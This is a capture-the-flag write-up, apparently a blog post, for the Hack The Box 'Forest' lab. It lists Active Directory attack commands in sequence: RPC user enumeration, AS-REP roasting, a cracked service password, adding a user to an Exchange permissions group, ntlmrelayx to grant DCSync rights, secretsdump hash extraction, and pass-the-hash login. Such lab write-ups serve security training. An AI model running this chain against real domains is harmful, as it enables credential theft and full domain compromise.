---
title: "Hack The Box - Forest"
tags: [windows,easy,rpc , rpcclient , asreproasting , roasting , bloodhound , WriteDACL , GenericAll , DCSync atttack , ntlmrelayx , secretsdump]
categories: HackTheBox-Active-Directory
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled.png)

## NMAP :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%201.png)

⇒ We are able to authenticate to rpc as guest user and enumerate users :

`rpcclient -U guest -H 10.10.10.161`

`enumdomusers`

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%202.png)

→ Lets save these usernames in an file then we can perform asreproast.

⇒ **ASREPRoasting** using impacket tool [GetNPUsers.py](http://getnpusers.py/)

`python3 [GetNPUsers.py](http://getnpusers.py/) -dc-ip 10.10.10.161 htb.local/ -usersfile users.txt -output hash`

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%203.png)

→ Cracking the password , we got svc-alfresco user password :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%204.png)

**svc-alfresco : s3rvice**

⇒ We used evil-winrm with svc-alfresco user credentials :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%205.png)

## Privilege Escalation to Administrator

⇒ Running Bloodhound :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%206.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%207.png)

→ Our user is in service accounts so we can create users.

→ We have `GenericAll` to **EXCHANGE WINDOWS PERMISSIONS** group :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%208.png)

→ Users in **EXCHANGE WINDOWS PERMISSIONS** group have `WriteDacl` to DC.

⇒ Creating a user and adding it to the group :

`net user jake s3rvice /add /domain`

`net group "EXCHANGE WINDOWS PERMISSION" jake /add`

⇒ Now we have **WriteDACL** we will use **ntlmrelayx** to give our user **DCSync** rights :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%209.png)

[`ntlmrelayx.py](http://ntlmrelayx.py/) -t ldap://10.10.10.161 --escalate-user jake` 

→ Authenticating :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%2010.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%2011.png)

→ Using impacket tool secretsdump to perform DCSync attack :

`secretsdump.py htb.local/jake:s3rvice@10.10.10.161`

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%2012.png)

⇒ Used the Administrator NTLM Hash with evil-winrm :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%2013.png)

